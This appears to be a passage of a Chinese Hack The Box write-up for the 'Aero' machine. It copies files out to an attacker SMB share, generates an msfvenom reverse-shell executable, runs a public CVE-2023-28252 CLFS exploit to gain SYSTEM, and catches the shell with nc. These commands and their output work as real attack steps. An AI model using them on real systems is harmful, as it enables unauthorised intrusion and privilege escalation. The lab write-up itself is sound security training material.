+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\sam.emerson&gt; tree /F /A<br>tree /F /A<br>Folder PATH listing<br>Volume serial number is C009<span class="hljs-number">-0</span>DB2<br>C:.<br>+---Contacts<br>+---Desktop<br>|       user.txt<br>|       <br>+---Documents<br>|       CVE<span class="hljs-number">-2023</span><span class="hljs-number">-28252</span>_Summary.pdf<br>|       watchdog.ps1<br>|       <br>+---Downloads<br>+---Favorites<br>|   |   Bing.url<br>|   |   <br>|   \---Links<br>+---Links<br>|       Desktop.lnk<br>|       Downloads.lnk<br>|       <br>+---Music<br>+---OneDrive<br>+---Pictures<br>|   +---Camera Roll<br>|   \---Saved Pictures<br>+---Saved Games<br>+---Searches<br>|       winrt--&#123;S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-3555993375</span><span class="hljs-number">-1320373569</span><span class="hljs-number">-1431083245</span><span class="hljs-number">-1001</span>&#125;-.searchconnector-ms<br>|       <br>\---Videos<br>PS C:\Users\sam.emerson&gt; <br></code></pre></td></tr></table></figure>
+
+<p>12、这里我直接使用上面呢个漏洞搭建的SMB服务，我把文件拷贝下来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\sam.emerson&gt; cd Documents<br>cd Documents<br>PS C:\Users\sam.emerson\Documents&gt; dir<br>dir<br><br><br>    Directory: C:\Users\sam.emerson\Documents<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>-a----         <span class="hljs-number">9</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2023</span>   <span class="hljs-number">9</span>:<span class="hljs-number">18</span> AM          <span class="hljs-number">14158</span> CVE<span class="hljs-number">-2023</span><span class="hljs-number">-28252</span>_Summary.pdf                                           <br>-a----         <span class="hljs-number">9</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2023</span>   <span class="hljs-number">1</span>:<span class="hljs-number">06</span> PM           <span class="hljs-number">1113</span> watchdog.ps1                                                         <br><br><br>PS C:\Users\sam.emerson\Documents&gt; copy ./CVE<span class="hljs-number">-2023</span><span class="hljs-number">-28252</span>_Summary.pdf \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>\tb\CVE<span class="hljs-number">-2023</span><span class="hljs-number">-28252</span>_Summary.pdf<br>copy ./CVE<span class="hljs-number">-2023</span><span class="hljs-number">-28252</span>_Summary.pdf \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>\tb\CVE<span class="hljs-number">-2023</span><span class="hljs-number">-28252</span>_Summary.pdf<br>PS C:\Users\sam.emerson\Documents&gt; copy ./watchdog.ps1 \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>\tb\watchdog.ps1<br>copy ./watchdog.ps1 \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>\tb\watchdog.ps1<br>PS C:\Users\sam.emerson\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<p>13、经过分析发现，这是一个漏洞预警的文件，让进行打补丁的</p>
+<p><img src="http://sh1yan.top/photo/Aero-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">CVE—<span class="hljs-number">2023</span>—<span class="hljs-number">28252</span>摘要：漏洞类型：恶意升级目标组件：通用日志文件系统（CLFS）风险级别：严重利用日期：<span class="hljs-number">2022</span>年<span class="hljs-number">2</span>月起Microsoft发布的修补程序：<span class="hljs-number">2023</span>年<span class="hljs-number">4</span>月<br><br><br>背景：Nokoyawa勒索软件集团自<span class="hljs-number">2022</span>年<span class="hljs-number">2</span>月以来一直活跃，直到<span class="hljs-number">2023</span>年<span class="hljs-number">4</span>月，微软才发布了解决此问题的补丁。此漏洞已被攻击者用作未经授权访问Windows系统的手段，因此我们必须应用必要的补丁程序来保护我们的基础设施。根据卡巴斯基的分析，自<span class="hljs-number">2022</span>年<span class="hljs-number">6</span>月以来，Nokoyawa勒索软件集团已经使用了针对CLFS驱动程序的其他漏洞，这些漏洞具有相似但不同的特征，所有这些都与单个漏洞开发者有关。<br><br><br>所需措施：立即修补：我们强烈建议尽快应用Microsoft针对CVE—<span class="hljs-number">2023</span>—<span class="hljs-number">28252</span>发布的安全修补程序，以缓解与此漏洞相关的风险。如果不这样做，我们的服务器可能会受到潜在的攻击。<br><br>审查和监测：除了打补丁，我们还应该对我们的服务器日志进行彻底审查，以检查任何可疑活动或未经授权访问的迹象。持续监控我们的服务器环境对于确保我们系统的安全至关重要。<br><br>安全意识：提醒所有团队成员保持良好的网络安全卫生的重要性至关重要。鼓励在适用的情况下使用强大、唯一的密码和双因素身份验证。<br><br><br>事件响应计划：确保我们的事件响应计划是最新的，并准备在发生任何安全事件时立即启动。及时检测和响应对于减轻潜在攻击的影响至关重要。<br></code></pre></td></tr></table></figure>
+
+<p>14、同时发现了自动查看的脚本文件。。。。</p>
+<p><img src="http://sh1yan.top/photo/Aero-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>15、根据上面的那个PDF，可以确认应该是当前机器还没有打这个补丁，我这里开始进行漏洞提权攻击</p>
+<p><code>https://github.com/duck-sec/CVE-2023-28252-Compiled-exe</code></p>
+<p>16、下载木马</p>
+<p><code>https://github.com/duck-sec/CVE-2023-28252-Compiled-exe/blob/master/exploit.exe</code></p>
+<p>17、生成反弹shell的EXE文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span> LPORT=<span class="hljs-number">4444</span> -f exe &gt; shell.exe<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No arch selected, selecting arch: x64 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: <span class="hljs-number">460</span> bytes<br>Final size of exe file: <span class="hljs-number">7168</span> bytes<br></code></pre></td></tr></table></figure>
+
+<p>18、开始上传到当前文件内，结合上面我们使用的SMB服务进行上传</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\sam.emerson\Documents&gt; cd ../Desktop<br>cd ../Desktop<br>PS C:\Users\sam.emerson\Desktop&gt; copy \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>\tb\exploit.exe .<br>copy \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>\tb\exploit.exe .<br>PS C:\Users\sam.emerson\Desktop&gt; dir<br>dir<br><br><br>    Directory: C:\Users\sam.emerson\Desktop<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>-a----         <span class="hljs-number">5</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">40</span> PM         <span class="hljs-number">367104</span> exploit.exe                                                          <br>-ar---         <span class="hljs-number">5</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">7</span>:<span class="hljs-number">45</span> PM             <span class="hljs-number">34</span> user.txt                                                             <br><br><br>PS C:\Users\sam.emerson\Desktop&gt; copy \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>\tb\shell.exe .<br>copy \\<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>\tb\shell.exe .<br>PS C:\Users\sam.emerson\Desktop&gt; dir<br>dir<br><br><br>    Directory: C:\Users\sam.emerson\Desktop<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>-a----         <span class="hljs-number">5</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">40</span> PM         <span class="hljs-number">367104</span> exploit.exe                                                          <br>-a----         <span class="hljs-number">5</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">5</span>:<span class="hljs-number">43</span> AM           <span class="hljs-number">7168</span> shell.exe                                                            <br>-ar---         <span class="hljs-number">5</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">7</span>:<span class="hljs-number">45</span> PM             <span class="hljs-number">34</span> user.txt                                                             <br><br><br>PS C:\Users\sam.emerson\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>19、开始执行利用提权：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\sam.emerson\Desktop&gt; ./exploit.exe <span class="hljs-number">1208</span> <span class="hljs-number">1</span> <span class="hljs-string">&quot;C:\Users\sam.emerson\Desktop\shell.exe&quot;</span><br>./exploit.exe <span class="hljs-number">1208</span> <span class="hljs-number">1</span> <span class="hljs-string">&quot;C:\Users\sam.emerson\Desktop\shell.exe&quot;</span><br>Executing command: C:\Users\sam.emerson\Desktop\shell.exe<br><br><br>ARGUMENTS<br>[+] TOKEN OFFSET <span class="hljs-number">4b</span>8<br>[+] FLAG <span class="hljs-number">1</span><br><br><br>VIRTUAL ADDRESSES AND OFFSETS<br>[+] NtFsControlFile Address --&gt; <span class="hljs-number">00007F</span>F920244240<br>[+] pool NpAt VirtualAddress --&gt;FFFFA685482FE000<br>[+] MY EPROCESSS FFFF800EDAFD4140<br>[+] SYSTEM EPROCESSS FFFF800ED26FC040<br>[+] _ETHREAD ADDRESS FFFF800ED8114080<br>[+] PREVIOUS MODE ADDRESS FFFF800ED81142B2<br>[+] Offset ClfsEarlierLsn --------------------------&gt; <span class="hljs-number">0000000000013220</span><br>[+] Offset ClfsMgmtDeregisterManagedClient --------------------------&gt; <span class="hljs-number">000000000002B</span>FB0<br>[+] Kernel ClfsEarlierLsn --------------------------&gt; FFFFF80251613220<br>[+] Kernel ClfsMgmtDeregisterManagedClient --------------------------&gt; FFFFF8025162BFB0<br>[+] Offset RtlClearBit --------------------------&gt; <span class="hljs-number">0000000000343010</span><br>[+] Offset PoFxProcessorNotification --------------------------&gt; <span class="hljs-number">00000000003</span>DBD00<br>[+] Offset SeSetAccessStateGenericMapping --------------------------&gt; <span class="hljs-number">00000000009</span>C87B0<br>[+] Kernel RtlClearBit --------------------------&gt; FFFFF8024CF43010<br>[+] Kernel SeSetAccessStateGenericMapping --------------------------&gt; FFFFF8024D5C87B0<br><br>[+] Kernel PoFxProcessorNotification --------------------------&gt; FFFFF8024CFDBD00<br><br><br>PATHS<br>[+] Folder Public Path = C:\Users\Public<br>[+] Base <span class="hljs-built_in">log</span> file name path= LOG:C:\Users\Public\<span class="hljs-number">25</span><br>[+] Base file path = C:\Users\Public\<span class="hljs-number">25.b</span>lf<br>[+] Container file name path = C:\Users\Public\.p_25<br>Last kernel CLFS address = FFFFA6853F00F000<br>numero de tags CLFS founded <span class="hljs-number">9</span><br><br>Last kernel CLFS address = FFFFA68541ED9000<br>numero de tags CLFS founded <span class="hljs-number">1</span><br><br>[+] Log file handle: <span class="hljs-number">000000000000011</span>C<br>[+] Pool CLFS kernel address: FFFFA68541ED9000<br><br>number of pipes created =<span class="hljs-number">5000</span><br><br>number of pipes created =<span class="hljs-number">4000</span><br>TRIGGER START<br>System_token_value: <span class="hljs-number">4141414141414141</span><br>TRYING AGAIN<br>TRIGGER START<br>System_token_value: <span class="hljs-number">4141414141414141</span><br>TRYING AGAIN<br>TRIGGER START<br>System_token_value: FFFFA6853AC41594<br>SYSTEM TOKEN CAPTURED<br>Closing Handle<br>ACTUAL USER=SYSTEM<br></code></pre></td></tr></table></figure>
+
+<p>20、成功获取到高权限的shell</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">4444</span><br>listening on [any] <span class="hljs-number">4444</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.45</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.237</span>] <span class="hljs-number">57493</span><br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.22000</span><span class="hljs-number">.1761</span>]<br>(c) Microsoft Corporation. All rights reserved.<br><br>C:\Users\sam.emerson\Desktop&gt;whoami<br>whoami<br>nt authority\system<br><br>C:\Users\sam.emerson\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+<p>21、查看flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\sam.emerson\Desktop&gt;cd C:/Users/administrator/Desktop<br>cd C:/Users/administrator/Desktop<br><br>C:\Users\Administrator\Desktop&gt;dir<br>dir<br> Volume in drive C has no label.<br> Volume Serial Number is C009<span class="hljs-number">-0</span>DB2<br><br> Directory of C:\Users\Administrator\Desktop<br><br><span class="hljs-number">09</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span>  <span class="hljs-number">04</span>:<span class="hljs-number">21</span> AM    &lt;DIR&gt;          .<br><span class="hljs-number">09</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2023</span>  <span class="hljs-number">05</span>:<span class="hljs-number">15</span> AM    &lt;DIR&gt;          ..<br><span class="hljs-number">05</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">07</span>:<span class="hljs-number">45</span> PM                <span class="hljs-number">34</span> root.txt<br>               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">34</span> bytes<br>               <span class="hljs-number">2</span> Dir(s)   <span class="hljs-number">6</span>,<span class="hljs-number">721</span>,<span class="hljs-number">974</span>,<span class="hljs-number">272</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\Administrator\Desktop&gt;cat root.txt<br>cat root.txt<br><span class="hljs-string">&#x27;cat&#x27;</span> is not recognized as an internal or external command,<br>operable program or batch file.<br><br>C:\Users\Administrator\Desktop&gt;type root.txt<br>type root.txt<br><span class="hljs-number">419361783f</span>936ba7ec3ca72cd73bde9e<br><br>C:\Users\Administrator\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/571</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Aero-htb-writeup</div>
+      <div>https://sh1yan.top/2024/05/24/Aero-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/22/Access-htb-writeup/" title="Access-htb-writeup">
+                        <span class="hidden-mobile">Access-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
